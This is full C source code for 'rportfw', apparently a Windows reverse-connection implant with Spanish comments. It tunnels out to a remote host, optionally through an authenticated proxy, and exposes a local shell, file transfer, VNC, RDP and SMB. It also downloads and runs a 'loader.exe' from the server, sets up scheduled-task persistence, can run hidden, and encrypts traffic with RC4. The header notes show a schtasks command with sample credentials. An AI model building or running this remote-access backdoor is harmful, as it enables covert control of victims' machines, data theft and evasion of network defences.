/**************************************************
 * redireccion remota puertos para conexion inversa 
 *
 * (mingw): gcc -Wall -s -Os rportfw.c -o rportfw -lwsock32
 * 
 * opciones compilacion: 
 * - para ejecutar en background: -DDAEMON -mwindows
 * - para usar proxy: -DPROXY
 * - para auto-descargar tools: -DLOADER
 * - para soportar compresion (miniz): -DCOMP
 * - para cifrar (rc4): -DCRYPT rc4.c 
 * 	
 * features: 
 * - conexion inversa a traves de proxy 
 * - redireccion remota de puertos
 * - auth basica
 * - cifrado opcional (rc4)
 * - compresion zlib (pendiente...)
 * - ejecucion automatica de comando asociado a puerto al conectar
 * - incluye cargador de herramientas en arranque
 * - incluye funcion auto-instalar en arranque (--install)
 *
 * notas:
 * - C:\PATH> gcc -Wall -O2  rportfw.c rc4.c -o rportfw -lwsock32 -DLOADER
 * - para "resiliance", programar watchdog (ej. 5min) 
 * - y configurar tarea windows a 1 dia, repetir cada 5 min, sin usuario logueado...
 * - ej. schtasks /create /sc minute /mo 5 /tn "rportfw" /tr "c:\temp\rportfw.exe" /st 00:00 /u MIDOM\usr1 /p secret123
 * - imprescindible copiar a temp (copy /y rportfw.exe %TEMP%)
 * - para instalar C:\PATH> rportfw --install 
 *
 **************************************************/
 
#include <windows.h>
#include <winsock.h>
#include <stdio.h>
#include <signal.h>
#include <unistd.h>
#include <time.h> 
#ifdef CRYPT
#include "rc4.h"
#endif
#ifdef COMP
#include "miniz.c"
#endif

#define SIGPIPE 13 
#define SHUT_RDWR 2
#define MSG_WAITALL 0x8
#define SOL_TCP 6  
#define TCP_USER_TIMEOUT 18 


/******************
* config
*******************/

// host a conectar
//#define HOST "X.X.X.X"
#define HOST "ivanov"
#define PORT 443
  
// instalador 
#define JOB_CMD "SCHTASKS /Create /SC minute /MO 1 /TN rportfw /TR %CD%\\rportfw.exe /F > NUL"

// donde guardar tools
#define LOADER_PATH "loader.exe"

// configuracion proxy
#define PROXY_HOST "10.0.0.1" 
#define PROXY_PORT 8080
#define PROXY_AUTH "TVlET01cdXNyMToxMjM0"

// clave compartida para cifrado
#define SKEY "secret0"

// configuramos canales
#define NUM_CHAN 7
#define SET_CHANNELS(chan) { \
\
	strcpy(chan[0].host, "127.0.0.1"); \
	chan[0].port = 6666; \
	strncpy(chan[0].cmd, "nsh", SZ_CMD); \
	chan[0].flags = X_CRYPT; \
\
	strcpy(chan[1].host, "127.0.0.1"); \
	chan[1].port = 6667; \
	strncpy(chan[1].cmd, "n2f o upload.tmp 6667", SZ_CMD); \
	chan[1].flags = X_CRYPT; \
\
	strcpy(chan[2].host, "127.0.0.1"); \
	chan[2].port = 6668; \
	strncpy(chan[2].cmd, "n2f i download.tmp 6668", SZ_CMD); \
	chan[2].flags = X_CRYPT; \
\
	strcpy(chan[3].host, "127.0.0.1"); \
	chan[3].port = 6669; \
	strncpy(chan[3].cmd, "", SZ_CMD); \
	chan[3].flags = 0; \
\
	strcpy(chan[4].host, "127.0.0.1"); \
	chan[4].port = 5900; \
	strncpy(chan[4].cmd, "winvnc.exe -run", SZ_CMD); \
	chan[4].flags = X_CRYPT; \
\
	strcpy(chan[5].host, "127.0.0.1"); \
	chan[5].port = 3389; \
	strncpy(chan[5].cmd, "", SZ_CMD); \
	chan[5].flags = 0; \
\
	strcpy(chan[6].host, "127.0.0.1"); \
	chan[6].port = 445; \
	strncpy(chan[6].cmd, "", SZ_CMD); \
	chan[6].flags = 0; \
}														

// ---- normalmente hasta aqui ----

// tiempo espera en lectura socket (ms)
#define TIMEOUT 100

// banner 
#define BANNER "rportfw v0.4 (C) 2014 Jose Ignacio Bravo"

// prompt cmd line
#define PROMPT "(client) "

// timeout (s)
#define WATCHDOG 300
#define KEEPALIVE 30

// parametrizacion buffers
#define SZ_SBUF 1024
#define SZ_CMD 256

// control de errores
#define MAGIC 0xFE

// modo verboso
#ifdef DEBUG
#define VERBOSE 1
#else
#define VERBOSE 0
#endif

// flags cabeceras
#ifdef COMP
#define X_COMP 0x01
#define IS_COMP(x) (x & X_COMP)
#endif
#ifdef CRYPT
#define X_CRYPT 0x02
#define IS_CRYPT(x) (x & X_CRYPT)
#endif 


/******************
* macros aux
*******************/

// varios
#define OFFSET sizeof(msg_hd)
#define MAX(x, y) (x > y ? x : y)

//  msg error y sale
#define ABORT(...) { \
                        if (VERBOSE) \
                        { \
                                fprintf(stderr, PROMPT); \
                                fprintf(stderr, "%s * ", time_stamp()); \
                                fprintf(stderr, "Abort: %s, line: %d\n", __FILE__, __LINE__); \
                                if (WSAGetLastError()) \
                                { \
                                        fprintf(stderr, PROMPT); \
                                        fprintf(stderr, "%s * ", time_stamp()); \
                                        perror("Abort"); \
                                } \
                        } \
			fprintf(stderr, PROMPT); \
			fprintf(stderr, "%s * ", time_stamp()); \
                        fprintf(stderr, "Abort: "); \
                        fprintf(stderr, __VA_ARGS__); \
						goto on_exit; \
}

// muestra error
#define ERR(...) { \
                        if (VERBOSE) \
                        { \
                                fprintf(stderr, PROMPT); \
                                fprintf(stderr, "%s * ", time_stamp()); \
                                fprintf(stderr, "Error: %s, line: %d\n", __FILE__, __LINE__); \
                        } \
			fprintf(stderr, PROMPT); \
			fprintf(stderr, "%s * ", time_stamp()); \
                        fprintf(stderr, "Error: "); \
                        fprintf(stderr, __VA_ARGS__); \
}

// muestra msg
#define MSG(...) 	{ \
                        printf(PROMPT); \
                        printf("%s * ", time_stamp()); \
                        printf(__VA_ARGS__); \
					}

// msg debug
#define DBG(...) 	if (VERBOSE)\
					{ \
                        printf(PROMPT); \
                        printf("%s * ", time_stamp()); \
                        printf(__VA_ARGS__); \
					}
// ejecuta, si -1, sale
#define TRY(x, msg) if ((x) == -1) ABORT(msg"\n");


/******************
* tipos
*******************/

// ---------------------
// cabecera comunicacion
// ---------------------
typedef struct {

        uint8_t magic;		// control errores 0xEF
	uint8_t ch;       	// num. canal
	uint16_t sz;        // tamanio datos (a cont.)
		
} t_msg_hd;

// ---------------------------------
// tipos de datos para redir puertos
// ---------------------------------
typedef struct {

        u_char up;
	char host[16];
	uint16_t port;
        int sock;
	char cmd[SZ_CMD];
	uint8_t flags;
	HANDLE pid;
		
} t_chan;


/******************
* variables globales
*******************/

// ciclos de reloj (watchdog) 
unsigned int ticks = 0;

// salir ?
int cont = 1;


/******************
* funciones
*******************/

// ----------------
// string timestamp
// ----------------
char *time_stamp()
{
	static char sbuf[25];
	time_t t = time(0);
	
	strcpy(sbuf, ctime(&t));
	sbuf[sizeof(sbuf) - 1] = 0;

	return sbuf;
}

// -------
// dirname
// -------
char *dirname(char *fname)
{
	char *p, *s; 
	
	// recorremos cadena, si \, anotamos
	for (p = 0, s = fname; *s; s++) 
		if (*s == '\\') p = s;
	
	// borramos la ultima parte (filename)
	if (p) *p = 0;
	
	return fname;
}

// --------------
// cerramos canal
// --------------
void close_chan(t_chan *ch)
{
	if (ch->up) {
	
		// cerramos socket
		shutdown(ch->sock, SHUT_RDWR);
		closesocket(ch->sock);
		ch->up = 0;
		
		// matamos proceso
		if (ch->pid) TerminateProcess(ch->pid, 0);
	}
}

// -------
// do_exit 
// -------
void do_exit(int sig) { cont = 0; }

// --------
// watchdog
// --------
static DWORD WINAPI watchdog(void* args)
{
	// esperamos... 
	for (;; Sleep(1000))
	
		// hasta timeout 
		if ((GetTickCount() - ticks) > (WATCHDOG * 1000)) {
		
			MSG("Timeout!\n");
			do_exit(SIGTERM);
			
			return -1;
		}
}

#ifdef COMP

// ----------
// compresion
// ----------
int z_comp(char *sbuf, int *sz)
{
	unsigned long zlen = SZ_SBUF;
	static u_char zbuf[SZ_SBUF];

	// comprimir
	if (compress(zbuf, &zlen, (u_char *) sbuf, *sz) != Z_OK) 
		return -1;

	// sobreescribimos
	memcpy(sbuf, zbuf, *sz = zlen);

	return 0;
}

// ------------
// descompresion
// -------------
int z_uncomp(char *sbuf, int *sz)
{
	unsigned long zlen = SZ_SBUF;
	static u_char zbuf[SZ_SBUF];

	// descomprimir
	if (uncompress(zbuf, &zlen, (u_char *) sbuf, *sz) != Z_OK) 
		return -1;

	// sobreescribimos
	memcpy(sbuf, zbuf, *sz = zlen);

	return 0;
}

#endif

// ---------------------------
// recv con control de errores
// ---------------------------
int x_recv(int sock, void *sbuf, size_t sz, int flags)
{
        // llamamos a recv
        if ((sz = recv(sock, sbuf, sz, flags)) == -1) {

                // error ?
                switch (errno = WSAGetLastError()) {

						case WSAEINTR:
						case WSAECONNRESET:
						case WSAEWOULDBLOCK:
						case WSAECONNABORTED:
						case WSAENOTSOCK: return 0;
						
                        default: return -1;
                }
        }

        return sz; 
}

// ---------------------------
// send con control de errores
// ---------------------------
int x_send(int sock, void *sbuf, size_t sz, int flags)
{
        // llamamos a send
        if ((sz = send(sock, sbuf, sz, flags)) == -1) {

                // error ?
                switch (errno = WSAGetLastError()) {

						case WSAEINTR:
						case WSAECONNRESET:
						case WSAEWOULDBLOCK:
						case WSAECONNABORTED:
						case WSAENOTSOCK: return 0;
					
                        default: return -1;
                }
        }

        return sz; 
}


// -----------------
// funcion principal
// -----------------
int main(int argc, char *argv[])
{
	char sbuf[SZ_SBUF];
	t_chan chan[NUM_CHAN], *ch;
	int sz, i, max, r, ka = 0;
	struct hostent *host;
	struct sockaddr_in sa;
	WSADATA wsaData;
	char cmd[SZ_CMD];
	PROCESS_INFORMATION pi;
	STARTUPINFO si;
	t_msg_hd msg_hd;
	fd_set rs;
	struct timeval tv;
	int sock = -1; 
#ifdef CRYPT
	struct rc4_state k;
#endif 
#ifdef LOADER
	FILE *f;
	uint32_t sz_f;
#endif
	
	
	/*** inicio ***/

	// bajamos prioridad
	SetPriorityClass(GetCurrentProcess(), IDLE_PRIORITY_CLASS);

	// cambiamos dir trabajo
	GetFullPathName(argv[0], SZ_SBUF, sbuf, 0);
	SetCurrentDirectory(dirname(sbuf));

	// desactivamos buffer salida
	setbuf(stdout, 0);
	
	// banner
	printf("%s\n", BANNER);
	printf("Starting client...\n\n");
	
	// control interrupciones 
	signal(SIGINT, do_exit);
	signal(SIGTERM, do_exit);
	signal(SIGPIPE, SIG_IGN);

	// inicializamos winsock
	if (WSAStartup(MAKEWORD(1, 1), &wsaData)) ABORT("WSAStartup\n");

	// configuramos canales
	memset(chan, 0, sizeof(chan));
	SET_CHANNELS(chan);
	
#ifdef CRYPT
	// inicializamos crypt
	rc4_setup(&k, (u_char *) SKEY, sizeof(SKEY));
#endif

	// instalamos ?
	if (argc > 1 && !strncasecmp(argv[1], "--install", 10)  ) {
	
		// configuramos scheduler para lanzar automaticamente
		MSG("Installing...\n");
		MSG("Creating scheduler...\n");
		system(JOB_CMD); 
		
		goto on_exit;
	}

	// instalamos watchdog 	
	ticks = GetTickCount();
	if (!CreateThread(0, 0, watchdog, 0, 0, 0)) ABORT("Watchdog\n");	

	
	/*** abrimos conexion con servidor ***/
	
	// creamos socket
	MSG("Creating sockets...\n");
	TRY((sock = socket(AF_INET, SOCK_STREAM, 0)), "socket");	 

	// user timeout in milliseconds [ms]
	int timeout = 10000;  
	setsockopt (sock, SOL_TCP, TCP_USER_TIMEOUT, (char*) &timeout, sizeof (timeout));
	
#ifdef PROXY /* inicio proxy */
	
	// resolucion nombres
	MSG("Resolving proxy hostname...\n");
	if (!(host = gethostbyname(PROXY_HOST))) ABORT("host not found\n");
			
	// configuramos socket
	sa.sin_family = AF_INET;
	sa.sin_port = htons(PROXY_PORT);
	sa.sin_addr =  *(struct in_addr *) host->h_addr;
	
	MSG("Connecting to proxy (%s:%d)...\n", PROXY_HOST, PROXY_PORT);

	// conectamos con proxy
	TRY(connect(sock, (struct sockaddr *) &sa, sizeof(sa)), "connect");

	// conectamos via proxy 
	sprintf(sbuf, "CONNECT %s:%d HTTP/1.1", HOST, PORT);
	sprintf(sbuf, "%s\r\nHost: %s %d", sbuf, HOST, PORT);
	sprintf(sbuf, "%s\r\nProxy-Authorization: Basic %s", sbuf, PROXY_AUTH);
	sprintf(sbuf, "%s\r\n\r\n", sbuf);
	
	MSG("Connecting to server (%s:%d)...\n", HOST, PORT);
	
	// enviamos cadena conexion 
	TRY(x_send(sock, sbuf, strlen(sbuf), 0), "send");
		
	// respuesta ?
	TRY(sz = x_recv(sock, sbuf, SZ_SBUF, 0), "recv");
			
	// HTTP/1.1 200 Connection established
	if (!sscanf(sbuf, "HTTP/1.1 %d", &r) || r != 200)
		ABORT(sbuf);

#else 

	// resolucion nombres
	MSG("Resolving hostname...\n");
	if (!(host = gethostbyname(HOST))) ABORT("host not found\n");
	
	// configuramos socket
	sa.sin_family = AF_INET;
	sa.sin_port = htons(PORT);
	sa.sin_addr =  *(struct in_addr *) host->h_addr;

	MSG("Connecting to server (%s:%d)...\n", HOST, PORT);

	// conectamos directamente
	TRY(connect(sock, (struct sockaddr *) &sa, sizeof(sa)), "connect");
	
#endif /* fin proxy */	

	MSG("Connected!\n");
	
#ifdef LOADER

	/*** descarga de herramientas adicionales ***/

	MSG("Receiving '%s'...\n", LOADER_PATH); 

	// primero, recibimos tamanio del fichero
	if (x_recv(sock, &sz_f, sizeof(sz_f), 0) > 0) {

		// primero creamos el fichero
		if (!(f = fopen(LOADER_PATH, "wb"))) ABORT("fopen"); 
	
		// hasta recibir tamanio completo
		while (sz_f) { 
		
			TRY(sz = x_recv(sock, sbuf, SZ_SBUF, 0), "recv");
			fwrite(sbuf, 1, sz, f); 
			sz_f -= sz;
		}
		
		// cerramos fichero
		fclose(f); 

		MSG("Running '%s'...\n", LOADER_PATH); 
		
		// ejecutamos autodescomp
		snprintf(cmd, SZ_CMD, "%s -o > nul", LOADER_PATH);
		system(cmd);
		
	} else ABORT("recv\n");
		
#endif 
	
	/*** intercambio de datos entre sockets ***/

	MSG("Waiting for connections...\n");
	
	// hasta CTRL+C
	while (cont) {
	
		// marcamos para lectura
		FD_ZERO(&rs);
		FD_SET(sock, &rs);
		max = sock;
		
		// para cada canal abierto... 
		for (i = 0; i < NUM_CHAN; i++) {
		
			// para escribir menos ;)
			ch = &chan[i];
			
			// marcamos para lectura
			if (ch->up) {
			
				FD_SET(ch->sock, &rs);
				max = MAX(max, ch->sock);
			}
		}
		
		// config timeout lectura
		tv.tv_sec = 0; tv.tv_usec = 1000 * TIMEOUT;
		
		// lectura socket async
		if ((r = select(max + 1, &rs, 0, 0, &tv)) > 0) {

			// reset watchdog
			ticks = GetTickCount();

			// server -> local:port
			if (FD_ISSET(sock, &rs)) {
			
				DBG("Reading remote server...\n");
				
				// uno menos que atender
				r--; 
				
				// leemos datos
				if ((sz = x_recv(sock, (char *) &msg_hd, OFFSET, 0)) > 0) {
					
					// para escribir menos ;)
					if ((i = msg_hd.ch) < NUM_CHAN) ch = &chan[i];
					
					// keepalive ? por canal 255
					if (msg_hd.magic == MAGIC && i == 255)  {
					
						DBG("Received keepalive...\n");
						ka = 0;
					
					} else {
						
						// control de errores 
						if (msg_hd.magic != MAGIC || msg_hd.sz > SZ_SBUF || i >= NUM_CHAN) {
						
							MSG("Packet corrupt!\n");
							
							// cerramos canal ?
							if (i < NUM_CHAN) {
							
								MSG("Closing channel %d...\n", i);
								close_chan(ch);
							}
							
						// si cerrado, abrimos canal						
						} else { 
						
							if (!ch->up)
							{
								MSG("Opening channel %d...\n", i);
								
								// lanzamos comando?
								if (strlen(ch->cmd))
								{
									MSG("Launching '%s'...\n", ch->cmd);
									
									// init structs
									memset(&si, 0, sizeof(si));
									si.cb = sizeof(si);
									
									// lanzamos proceso a escucha 
									if (!CreateProcess(0, ch->cmd, 0, 0, 0, 0, 0, 0, &si, &pi))
										ABORT("CreateProcess\n");
									
									// guardamos "pid" 
									ch->pid = pi.hProcess;
										
									// esperamos un poco...
									Sleep(1000);
								}
										
								MSG("Connecting to local port (%d)...\n", ch->port);
								
								// creamos socket
								TRY(ch->sock = socket(AF_INET, SOCK_STREAM, 0), "socket");
								
								// configuramos ip:puerto
								sa.sin_family = AF_INET;
								sa.sin_port = htons(ch->port);
								sa.sin_addr.s_addr = inet_addr(ch->host);
								
								// conectamos
								TRY(connect(ch->sock, (struct sockaddr *) &sa, sizeof(sa)), "connect");
									
								// marcamos como conectado
								ch->up = 1; 
								
							} else {
							
								// mas datos ?
								if (msg_hd.sz) {

									DBG("Remote -> local (%d): %d bytes\n", i, msg_hd.sz);
									
									// recuperamos datos 
									TRY(sz = x_recv(sock, sbuf, msg_hd.sz, MSG_WAITALL), "recv");
#ifdef CRYPT
									// desciframos
									if (IS_CRYPT(ch->flags)) rc4_crypt(&k, (u_char *) sbuf, sz);	
#endif
#ifdef COMP
									// descomprimimos
									if (IS_COMP(ch->flags)) TRY(z_uncomp(sbuf, &sz), "comp"); 
#endif			
									// copiamos datos...
									TRY(x_send(ch->sock, sbuf, sz, 0), "send");
									
								// no (suponemos cerrado)							
								} else {

									MSG("Channel %d closed!\n", i);
									
									// enviamos cabecera
									msg_hd.sz = 0;
									TRY(x_send(sock, (char *)&msg_hd, OFFSET, 0), "send");
									
									// cerramos socket
									close_chan(ch);
								}
							}
						}
					}
					
				// cerrado conexion
				} else {
				
					MSG("Closed!\n");
					break;	
				}
			}
			
			// ahora comprobamos cada canal
			for (i = 0; r && i < NUM_CHAN; i++) {
			
				ch = &chan[i];
				
				// tiene datos?
				if (FD_ISSET(ch->sock, &rs)) {
				
					DBG("Reading local port (%d)...\n", i);
					
					// uno menos que atender
					r--;
					
					// construimos cabecera
					msg_hd.magic = MAGIC;
					msg_hd.ch = i;
				
					// si hay datos enviamos 
					if ((sz = x_recv(ch->sock, sbuf, SZ_SBUF, 0)) > 0) {
#ifdef COMP					
						// comprimimos
						if (IS_COMP(ch->flags)) TRY(z_comp(sbuf, &sz), "comp");
#endif				
#ifdef CRYPT
						// ciframos
						if (IS_CRYPT(ch->flags)) rc4_crypt(&k, (u_char *) sbuf, sz);
#endif			
						// enviamos cabecera
						msg_hd.sz = sz;
						TRY(x_send(sock, (char *) &msg_hd, OFFSET, 0), "send");
					
						// enviamos datos a server 
						TRY(x_send(sock, sbuf, sz, 0), "send");
						
						DBG("Local -> remote (%d): %d bytes\n", i, sz);	

					// suponemos, cerrado channel						
					} else {

						MSG("Channel %d closed!\n", i);
					
						// enviamos cabecera para indicar que cerrado
						msg_hd.sz = 0;
						TRY(x_send(sock, (char *) &msg_hd, OFFSET, 0), "send");
												
						// cerramos socket
						close_chan(ch);
					}
				}
			}
		}
		
		// enviamos keepalive ?
		if(((GetTickCount() - ticks) > (KEEPALIVE * 1000)) && !ka)
		{
			DBG("Sending keepalive...\n"); 
			
			// no mas keepalive, de momento
			ka = 1; 
			
			// construimos paquete: 255 reservado
			msg_hd.magic = MAGIC; 
			msg_hd.ch = 255; 
			msg_hd.sz = 0;
			
			// enviamos
			TRY(x_send(sock, (char *) &msg_hd, OFFSET, 0), "send"); 
		}
	}

on_exit: 
	
	// salimos
	MSG("Exiting...\n");
		
	// cerramos socket server
	shutdown(sock, SHUT_RDWR);
	closesocket(sock);
	
	// puertos redirigidos, cerramos canales
	for (i = 0; i < NUM_CHAN; i++) 
		if (chan[i].up) close_chan(&chan[i]);
	
	// cerramos winsock	
	WSACleanup();
	
	MSG(">>> Done <<<\n\n"); 
	
	return cont;
}
